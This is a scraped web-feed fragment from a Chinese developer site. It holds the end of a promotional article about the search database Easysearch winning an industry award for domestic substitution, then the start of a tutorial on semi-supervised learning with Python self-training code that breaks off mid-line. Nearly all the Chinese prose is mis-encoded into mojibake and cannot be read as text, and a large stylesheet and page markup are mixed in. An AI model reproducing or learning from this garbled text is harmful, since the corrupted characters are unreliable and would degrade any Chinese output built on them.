ä¸­å›½å¤§æ•°æ®äº§ä¸šã€Œå¹´åº¦å›½äº§åŒ–ä¼˜ç§€ä»£è¡¨å‚å•†ã€</strong>ã€‹æ¦œå•ï¼Œå¹¶è·é¢è¿™ä¸€è¡Œä¸šé‡ç£…å¥–é¡¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22a64040821c46d986272af278c3a58d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B6ZmQ5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529027&amp;x-signature=qa4TrINjxBYZKUeMlAwprC4slbo%3D" alt="" loading="lazy"/></p>
<p>æœ¬å±Šè®ºå›ç”±é‡‘çŒ¿ç»„å§”ä¼šã€æ•°æ®çŒ¿ã€ä¸Šæµ·å¸‚æ•°å•†åä¼šåŠä¸Šæµ·å¤§æ•°æ®è”ç›Ÿè”åˆä¸»åŠï¼Œä»¥â€œ<strong>æ•°æ®æœ‰çŒ¿Â·æ™ºè§åå¹´</strong>â€ä¸ºä¸»é¢˜ï¼Œå¸å¼•äº†è¿‘åƒå®¶ä¼ä¸šå‚ä¸ç”³æŠ¥ã€‚ç»è¿‡ä¸¥æ ¼çš„åˆå®¡ã€å…¬å®¡ä¸ç»ˆå®¡äº¤å‰éªŒè¯æœºåˆ¶ï¼Œæé™ç§‘æŠ€æœ€ç»ˆä»ä¼—å¤šç«äº‰è€…ä¸­è„±é¢–è€Œå‡ºï¼Œè£ç™»æ¦œå•ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e834ea43b3fc48ed8c511ff98545f4d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B6ZmQ5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529027&amp;x-signature=uU%2F2YDxQ%2FETkfbGI6hqpFWd8igY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">æ·±è€•æ ¸å¿ƒæœç´¢æŠ€æœ¯ï¼Œå¡«è¡¥å›½äº§åŒ–ç©ºç™½</h2>
<p>æé™ç§‘æŠ€æˆç«‹äº 2021 å¹´ 12 æœˆï¼Œæ˜¯ä¸€å®¶ä¸“æ³¨äºå¤§æ•°æ®æœç´¢ä¸åˆ†æçš„åŸºç¡€è½¯ä»¶å…¬å¸ã€‚å…¬å¸æ€»éƒ¨ä½äºåŒ—äº¬ï¼Œåœ¨é•¿æ²™è®¾ç«‹ç ”å‘ä¸­å¿ƒï¼Œå¹¶åœ¨ä¸Šæµ·ã€å¹¿å·è®¾ç«‹åŠäº‹å¤„æˆ–æœåŠ¡ä¸­å¿ƒã€‚å…¶æ ¸å¿ƒå›¢é˜Ÿå‡æ¥è‡ª Elasticsearch åŸå‚åŠä¸­æ–‡ç¤¾åŒºï¼Œæ‹¥æœ‰å¤šå¹´ ES æºç å¼€å‘ç»éªŒï¼Œè‡´åŠ›äºâ€œè®©æœç´¢æ›´ç®€å•â€ï¼Œæ‰“é€ æè‡´æ˜“ç”¨çš„æ•°æ®æ¢ç´¢ä¸åˆ†æä½“éªŒã€‚</p>
<p>å…¬å¸è‡ªä¸»ç ”å‘çš„æ ¸å¿ƒäº§å“ Easysearch æœç´¢å‹æ•°æ®åº“ï¼Œæ˜¯æˆ‘å›½åœ¨åˆ†å¸ƒå¼æœç´¢å‹æ•°æ®åº“é¢†åŸŸå®ç°å…³é”®å›½äº§åŒ–æ›¿ä»£çš„ä»£è¡¨æ€§æˆæœã€‚è¯¥äº§å“ç²¾å‡†å¡«è¡¥äº†å›½å†…åœ¨è½»é‡åŒ–ã€é«˜æ€§èƒ½ã€è‡ªä¸»å¯æ§æœç´¢å¼•æ“æ–¹é¢çš„å¸‚åœºç©ºç™½ã€‚</p>
<h2 data-id="heading-1">äº§å“æ€§èƒ½å“è¶Šï¼Œå®ç°æ— ç¼è¿ç§»ä¸è¶…è¶Š</h2>
<p>Easysearch æ”¯æŒç»“æ„åŒ–ä¸éç»“æ„åŒ–æ•°æ®æ£€ç´¢ã€å…¨æ–‡æ£€ç´¢ã€å‘é‡æ£€ç´¢ã€ç©ºé—´åœ°ç†ä½ç½®ä¿¡æ¯æ£€ç´¢ã€å¤šæ¨¡æ€æ··åˆæ£€ç´¢ã€ç»„åˆæŸ¥è¯¢ã€å¤šè¯­ç§æ”¯æŒã€è¯­ä¹‰åˆ†æã€èšåˆåˆ†æç­‰å¤šç§æ ¸å¿ƒåŠŸèƒ½ã€‚æµ‹è¯•è¡¨æ˜ï¼Œå…¶æ€§èƒ½å·²è¾¾åˆ°ç”šè‡³ä¼˜äºå›½å¤–é¢†å…ˆäº§å“ã€‚</p>
<p>åœ¨äº§å“èƒ½åŠ›ä¸Šï¼ŒEasysearch ä¸ä»…å®Œå…¨å…¼å®¹ Elasticsearch çš„ç”Ÿæ€æ¥å£ï¼Œä¿éšœäº†ç”¨æˆ·ä¸šåŠ¡çš„æ— ç¼å¹³æ»‘è¿ç§»ï¼Œæ›´åœ¨æ€§èƒ½ä¼˜åŒ–ã€å­˜å‚¨æ•ˆç‡ã€ä¼ä¸šçº§å®‰å…¨åŠåŸç”Ÿä¸­æ–‡å¤„ç†ç­‰æ–¹é¢å®ç°äº†æ˜¾è‘—è¶…è¶Šã€‚å…¶å†…ç½®çš„ Web ç®¡ç†æ§åˆ¶å°ã€å…¨é¢çš„æ•°æ®åŠ å¯†ä¸æƒé™ç®¡æ§åŠŸèƒ½ï¼Œæä¾›äº†å¼€ç®±å³ç”¨çš„ä¼ä¸šçº§ä½“éªŒã€‚</p>
<h2 data-id="heading-2">æ„å»ºå®Œæ•´ä¿¡åˆ›ç”Ÿæ€</h2>
<p>å°¤ä¸ºå…³é”®çš„æ˜¯ï¼ŒEasysearch ç‡å…ˆå®Œæˆäº†ä¸å›½äº§ä¸»æµ CPUï¼ˆå¦‚é²²é¹ã€é£è…¾ã€æµ·å…‰ã€é¾™èŠ¯ã€ç”³å¨ã€å…†èŠ¯ç­‰ï¼‰å’Œæ“ä½œç³»ç»Ÿï¼ˆå¦‚ç»Ÿä¿¡ UOSã€é“¶æ²³éº’éºŸã€å¼€æºæ¬§æ‹‰ç­‰ï¼‰çš„æ·±åº¦é€‚é…ä¸äº’è®¤è¯ï¼Œæ„å»ºäº†å®Œæ•´çš„ä¿¡åˆ›æŠ€æœ¯æ ˆæ”¯æŒèƒ½åŠ›ï¼Œå½»åº•è§£å†³äº†å›½å¤–äº§å“åœ¨å›½äº§åŒ–ç¯å¢ƒä¸‹å…¼å®¹æ€§å·®ã€ç»´æŠ¤å›°éš¾ã€æ›´æ–°å—é™ç­‰é•¿æœŸå­˜åœ¨çš„ç—›ç‚¹ã€‚</p>
<p>åœ¨æ ¸å¿ƒæŠ€æœ¯å›½äº§åŒ–æ„ä¹‰ä¸Šï¼ŒEasysearch é€šè¿‡å®Œå…¨è‡ªä¸»å¯æ§çš„åˆ†å¸ƒå¼æœç´¢æŠ€æœ¯ä½“ç³»ï¼Œçªç ´äº†å…³é”®åŸºç¡€è½¯ä»¶ä¾èµ–å›½å¤–ä¼ä¸šçš„å±€é¢ï¼Œæ»¡è¶³äº†æ”¿åºœã€é‡‘èã€èƒ½æºã€è¿è¥å•†ç­‰è¡Œä¸šå¯¹â€œå¯æ§ã€å®‰å…¨ã€å¯æ›¿ä»£â€çš„æˆ˜ç•¥éœ€æ±‚ã€‚åŒæ—¶ï¼Œå…¶å‘é‡æœç´¢å’Œ AI æ£€ç´¢èƒ½åŠ›å¡«è¡¥äº†å›½å†…åœ¨æ™ºèƒ½æœç´¢ä¸å¤§æ¨¡å‹ç»“åˆé¢†åŸŸçš„æŠ€æœ¯ç¼ºå£ã€‚</p>
<h2 data-id="heading-3">è·æƒå¨èµ„è´¨è®¤å¯ï¼Œè½åœ°ä¼—å¤šå¤´éƒ¨å®¢æˆ·</h2>
<p>æé™ç§‘æŠ€åŠ Easysearch å·²è·å¾—å¤šé¡¹æƒå¨èµ„è´¨è®¤è¯ï¼ŒåŒ…æ‹¬å›½å®¶é«˜æ–°æŠ€æœ¯ä¼ä¸šã€ISO ä¸‰å¤§ç®¡ç†ä½“ç³»è®¤è¯ï¼Œå¹¶è£è· 2023 å¹´æ˜Ÿæ²³æ¡ˆä¾‹æ•°æ®åº“æ ‡æ†æ¡ˆä¾‹ã€‚äº§å“äº¦é€šè¿‡äº†ä¿¡é€šé™¢åŸºç¡€èƒ½åŠ›ä¸“é¡¹æµ‹è¯„åŠä¸­å›½æ³°å°”å®éªŒå®¤æ£€éªŒæµ‹è¯•ã€‚</p>
<p>ç›®å‰ï¼ŒEasysearch å·²åœ¨é‡‘èã€è¿è¥å•†ã€åˆ¶é€ ã€æ”¿ä¼ç­‰å¤šé¢†åŸŸå®ç°è§„æ¨¡åŒ–è½åœ°ï¼ŒæœåŠ¡å®¢æˆ·åŒ…æ‹¬ç§»åŠ¨äº‘ã€ä¸­å›½ä¸€æ±½ã€ä¸­å›½äººä¿ã€ä¸œèè¯åˆ¸ã€èˆªå¤©ä¿¡æ¯ç­‰å¤´éƒ¨ä¼ä¸šï¼Œç´¯è®¡ä¸‹è½½éƒ¨ç½²é‡å·²è¶…è¿‡ 500 ä¸‡æ¬¡ã€‚å…¶ä¸­ï¼Œå…¬å¸å¼€å‘çš„ä¸­æ–‡åˆ†è¯å™¨ï¼ˆIKã€Pinyinï¼‰ã€å‹æµ‹å·¥å…·ï¼ˆLoadgenï¼‰ã€æ•°æ®è¿ç§»å·¥å…·ï¼ˆESMï¼‰å·²è¢« 85% çš„ä¸­å›½ Elasticsearch ç”¨æˆ·éƒ¨ç½²åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ã€‚</p>
<h2 data-id="heading-4">è£è·è¡Œä¸šå¤§å¥–ï¼Œå½°æ˜¾æ ‡æ†ä»·å€¼</h2>
<p>æ­¤æ¬¡è£è· â€œå¹´åº¦å›½äº§åŒ–ä¼˜ç§€ä»£è¡¨å‚å•†â€ å¥–é¡¹ï¼Œä¸ä»…æ˜¯è¡Œä¸šå¯¹æé™ç§‘æŠ€æŠ€æœ¯å®åŠ›ä¸å›½äº§åŒ–è´¡çŒ®çš„é«˜åº¦è®¤å¯ï¼Œæ›´å½°æ˜¾äº†å…¬å¸åœ¨æ¨åŠ¨å¤§æ•°æ®äº§ä¸šè‡ªä¸»åˆ›æ–°è¿›ç¨‹ä¸­çš„æ ‡æ†ä½œç”¨ã€‚</p>
<p>æé™ç§‘æŠ€åˆ›å§‹äººè¡¨ç¤ºï¼š</p>
<blockquote>
<p>â€œæˆ‘ä»¬åšä¿¡â€˜è¿½æ±‚æè‡´ï¼Œæ— é™å¯èƒ½â€™ã€‚è·å¾—è¿™ä»½è£èª‰ï¼Œæ˜¯å¯¹æˆ‘ä»¬å›¢é˜Ÿå¤šå¹´æ¥åšæŒè‡ªä¸»åˆ›æ–°ã€æ·±è€•æœç´¢æŠ€æœ¯çš„æœ€å¥½é¼“åŠ±ã€‚æœªæ¥ï¼Œæé™ç§‘æŠ€å°†æŒç»­åŠ å¤§ç ”å‘æŠ•å…¥ï¼Œä»¥æŠ€æœ¯åˆ›æ–°é©±åŠ¨äº§ä¸šå‡çº§ï¼Œä¸ºå„è¡Œä¸šå®¢æˆ·æä¾›æ›´é«˜æ•ˆã€æ›´å®‰å…¨ã€æ›´æ™ºèƒ½çš„æ•°æ®æ¢ç´¢ä¸åˆ†æèƒ½åŠ›ï¼ŒåŠ©åŠ›ä¸­å›½å¤§æ•°æ®äº§ä¸šåœ¨æ™ºèƒ½æ—¶ä»£å®ç°é«˜è´¨é‡ã€è‡ªä¸»å¯æ§çš„å‘å±•ã€‚â€</p>
</blockquote>
<hr/>
<p>ç›¸å…³é“¾æ¥ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0aMKBWhE1cJ2toAMkUwGYw" target="_blank" title="https://mp.weixin.qq.com/s/0aMKBWhE1cJ2toAMkUwGYw" ref="nofollow noopener noreferrer">ã€Š2025 ä¸­å›½å¤§æ•°æ®äº§ä¸šå¹´åº¦ã€Œå›½äº§åŒ–ä¼˜ç§€ä»£è¡¨å‚å•†ã€ã€‹æ¦œå•/å¥–é¡¹</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F_77xDmEvPMli_fZh0YsYCA" target="_blank" title="https://mp.weixin.qq.com/s/_77xDmEvPMli_fZh0YsYCA" ref="nofollow noopener noreferrer">ã€é‡‘çŒ¿å›½äº§åŒ–å±•ã€‘Easysearch â€”â€” ä¸€ä¸ªè‡ªä¸»å¯æ§ã€å®‰å…¨å¯é çš„ä¼ä¸šçº§æœç´¢è§£å†³æ–¹æ¡ˆ</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­åŠç›‘ç£å­¦ä¹ çš„ç»å…¸æ–¹æ³•ï¼]]></title>    <link>https://juejin.cn/post/7597258378590830602</link>    <guid>https://juejin.cn/post/7597258378590830602</guid>    <pubDate>2026-01-20T15:53:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597258378590830602" data-draft-id="7597251197426466842" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­åŠç›‘ç£å­¦ä¹ çš„ç»å…¸æ–¹æ³•ï¼"/> <meta itemprop="keywords" content="é¢è¯•,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-20T15:53:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aicoting"/> <meta itemprop="url" content="https://juejin.cn/user/933911964427818"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸‡å­—é•¿æ–‡ï¼ææ‡‚æœºå™¨å­¦ä¹ ä¸­åŠç›‘ç£å­¦ä¹ çš„ç»å…¸æ–¹æ³•ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933911964427818/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aicoting
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:53:17.000Z" title="Tue Jan 20 2026 15:53:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æ¨èç›´æ¥ç½‘ç«™åœ¨çº¿é˜…è¯»ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Faicoting.cn%2F" target="_blank" title="https://aicoting.cn/" ref="nofollow noopener noreferrer">aicoting.cn</a></p>
</blockquote>
<p>åŠç›‘ç£å­¦ä¹ ï¼ˆSemi-Supervised Learningï¼‰æ˜¯ä¸€ç±»ä»‹äºç›‘ç£å­¦ä¹ å’Œæ— ç›‘ç£å­¦ä¹ ä¹‹é—´çš„æ–¹æ³•ï¼Œæ—¨åœ¨åˆ©ç”¨å°‘é‡å¸¦æ ‡ç­¾çš„æ•°æ®ä¸å¤§é‡æ— æ ‡ç­¾çš„æ•°æ®å…±åŒè®­ç»ƒæ¨¡å‹ã€‚åœ¨ç°å®ä»»åŠ¡ä¸­ï¼Œæ ‡æ³¨æ•°æ®é€šå¸¸è·å–æˆæœ¬é«˜ï¼Œè€Œæ— æ ‡ç­¾æ•°æ®ä¸°å¯Œï¼Œæ¯”å¦‚è¦è¿›è¡Œç‰©ä½“æ£€æµ‹ï¼Œé‚£ä¹ˆå°±è¦äººå·¥ç”¨ä¸€ä¸ªæ–¹æ¡†æŠŠä¸åŒçš„ç‰©ä½“æ ‡æ³¨å‡ºæ¥ï¼Œè€Œä¸”ä¸åŒçš„ç±»åˆ«æ ‡æ³¨ä¹Ÿè¦ä¸åŒï¼Œæˆ‘åœ¨å¤§ä¸‰çš„æ—¶å€™å°±å¹²è¿‡ï¼Œä»é‚£ä¹‹åå†ä¹Ÿä¸æƒ³æ ‡æ³¨äº†ï¼Œè¿™ä¸ªæ˜¯è€—è´¹æ—¶é—´å’Œç²¾åŠ›å·¨å¤§çš„ä¸€ä¸ªå·¥ä½œã€‚</p>
<p>åŠç›‘ç£å­¦ä¹ é€šè¿‡æŒ–æ˜æ•°æ®åˆ†å¸ƒç»“æ„ä¸æ ‡ç­¾ä¿¡æ¯ä¹‹é—´çš„å…³è”ï¼Œæé«˜æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›ã€‚å…¶ä¸»è¦æŠ€æœ¯åŒ…æ‹¬è‡ªè®­ç»ƒã€ååŒè®­ç»ƒã€åŸºäºå›¾çš„æ ‡ç­¾ä¼ æ’­ã€åŠç›‘ç£æ”¯æŒå‘é‡æœºä»¥åŠä¸æ·±åº¦å­¦ä¹ ç»“åˆçš„ç”Ÿæˆå¼ä¸ä¸€è‡´æ€§æ­£åˆ™åŒ–æ–¹æ³•ï¼Œå¹¿æ³›åº”ç”¨äºæ–‡æœ¬åˆ†ç±»ã€å›¾åƒè¯†åˆ«ã€åŒ»ç–—åˆ†æç­‰åœºæ™¯ã€‚</p>
<h2 data-id="heading-0">è‡ªè®­ç»ƒ</h2>
<p>è‡ªè®­ç»ƒï¼ˆSelf-trainingï¼‰æ˜¯åŠç›‘ç£å­¦ä¹ ä¸­æœ€ç»å…¸ã€æœ€ç›´è§‚çš„æ–¹æ³•ä¹‹ä¸€ã€‚å®ƒé€šè¿‡åˆ©ç”¨å°‘é‡å¸¦æ ‡ç­¾æ•°æ®è®­ç»ƒä¸€ä¸ªåˆå§‹æ¨¡å‹ï¼Œå†å€ŸåŠ©è¯¥æ¨¡å‹å¯¹æœªæ ‡æ³¨æ•°æ®è¿›è¡Œé¢„æµ‹ï¼Œå°†é«˜ç½®ä¿¡åº¦çš„é¢„æµ‹ç»“æœä½œä¸ºä¼ªæ ‡ç­¾ï¼ˆpseudo labelsï¼‰ï¼Œé€æ­¥æ‰©å……è®­ç»ƒé›†ï¼Œä»è€Œæå‡æ¨¡å‹æ€§èƒ½ã€‚è‡ªè®­ç»ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ æ¨¡å‹è‡ªå·±æ•™è‡ªå·±ï¼Œä¸æ–­åˆ©ç”¨æ— æ ‡ç­¾æ•°æ®ä¸­æ½œåœ¨çš„ä¿¡æ¯æ¥æ”¹è¿›é¢„æµ‹èƒ½åŠ›ã€‚</p>
<p>è‡ªè®­ç»ƒçš„ä¸€èˆ¬è¿‡ç¨‹å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>åˆå§‹è®­ç»ƒï¼šä½¿ç”¨å°‘é‡æ ‡æ³¨æ•°æ®è®­ç»ƒä¸€ä¸ªç›‘ç£å­¦ä¹ æ¨¡å‹ã€‚</li>
<li>ä¼ªæ ‡ç­¾ç”Ÿæˆï¼šç”¨è¯¥æ¨¡å‹é¢„æµ‹æœªæ ‡æ³¨æ•°æ®ï¼Œå¹¶è®¡ç®—æ¯ä¸ªæ ·æœ¬çš„ç½®ä¿¡åº¦ã€‚</li>
<li>æ ·æœ¬ç­›é€‰ï¼šé€‰æ‹©ç½®ä¿¡åº¦è¾ƒé«˜çš„é¢„æµ‹æ ·æœ¬ï¼Œèµ‹äºˆå…¶ä¼ªæ ‡ç­¾ã€‚</li>
<li>æ•°æ®æ‰©å……ï¼šå°†è¿™äº›ä¼ªæ ‡ç­¾æ ·æœ¬åŠ å…¥è®­ç»ƒé›†ï¼Œå½¢æˆæ–°çš„â€œæ ‡æ³¨â€æ•°æ®é›†ã€‚</li>
<li>è¿­ä»£æ›´æ–°ï¼šé‡æ–°è®­ç»ƒæ¨¡å‹ï¼Œå¹¶é‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œç›´åˆ°æ€§èƒ½æ”¶æ•›æˆ–è¾¾åˆ°é¢„è®¾è¿­ä»£æ¬¡æ•°ã€‚</li>
</ol>
<p>ä»¥é€»è¾‘å›å½’ï¼ˆLogistic Regressionï¼‰ä¸ºä¾‹ï¼Œå¯ä»¥å…ˆç”¨å°‘é‡å¸¦æ ‡ç­¾æ ·æœ¬è®­ç»ƒä¸€ä¸ªæ¨¡å‹ï¼Œç„¶ååˆ©ç”¨è¯¥æ¨¡å‹é¢„æµ‹æœªæ ‡æ³¨æ ·æœ¬çš„ç±»åˆ«ï¼Œå¹¶é€‰æ‹©ç½®ä¿¡åº¦è¶…è¿‡é˜ˆå€¼çš„æ ·æœ¬ä½œä¸ºä¼ªæ ‡ç­¾ï¼Œé€æ­¥åŠ å…¥è®­ç»ƒé›†ï¼Œè¿­ä»£æ›´æ–°æ¨¡å‹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_iris
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

<span class="hljs-comment"># 1. åŠ è½½æ•°æ®ï¼Œåªå–å‰ä¸¤ä¸ªç‰¹å¾ä¾¿äºäºŒç»´å¯è§†åŒ–</span>
X, y = load_iris(return_X_y=<span class="hljs-literal">True</span>)
X = X[:, :<span class="hljs-number">2</span>]

n_labeled = <span class="hljs-number">30</span>
X_labeled, y_labeled = X[:n_labeled], y[:n_labeled]
X_unlabeled = X[n_labeled:]

<span class="hljs-comment"># 2. åˆå§‹è®­ç»ƒ</span>
model = LogisticRegression(max_iter=<span class="hljs-number">200</span>)
model.fit(X_labeled, y_labeled)

<span class="hljs-comment"># å¯è§†åŒ–å‡½æ•°ï¼šç»˜åˆ¶å†³ç­–è¾¹ç•Œ + å·²æ ‡æ³¨/ä¼ªæ ‡ç­¾æ ·æœ¬</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">plot_step</span>(<span class="hljs-params">X_labeled, y_labeled, X_unlabeled, title</span>):
    h = <span class="hljs-number">.02</span>  <span class="hljs-comment"># ç½‘æ ¼æ­¥é•¿</span>
    x_min, x_max = X[:, <span class="hljs-number">0</span>].<span class="hljs-built_in">min</span>() - <span class="hljs-number">1</span>, X[:, <span class="hljs-number">0</span>].<span class="hljs-built_in">max</span>() + <span class="hljs-number">1</span>
    y_min, y_max = X[:, <span class="hljs-number">1</span>].<span class="hljs-built_in">min</span>() - <span class="hljs-number">1</span>, X[:, <span class="hljs-number">1</span>].<span class="hljs-built_in">max</span>() + <span class="hljs-number">1</span>
    xx, yy = np.meshgrid(np.arange(x_min, x_max, h),
                         np.arange(y_min, y_max, h))
    
    Z = model.predict(np.c_[xx.ravel(), yy.ravel()])
    Z = Z.reshape(xx.shape)
    
    plt.contourf(xx, yy, Z, alpha=<span class="hljs-number">0.3</span>, cmap=plt.cm.Set1)
    plt.scatter(X_unlabeled[:, <span class="hljs-number">0</span>], X_unlabeled[:, <span class="hljs-number">1</span>], 
                c=<span class="hljs-string">'gray'</span>, marker=<span class="hljs-string">'x'</span>, label=<span class="hljs-string">'Unlabeled'</span>, alpha=<span class="hljs-number">0.5</span>)
    plt.scatter(X_labeled[:, <span class="hljs-number">0</span>], X_labeled[:, <span class="hljs-number">1</span>], 
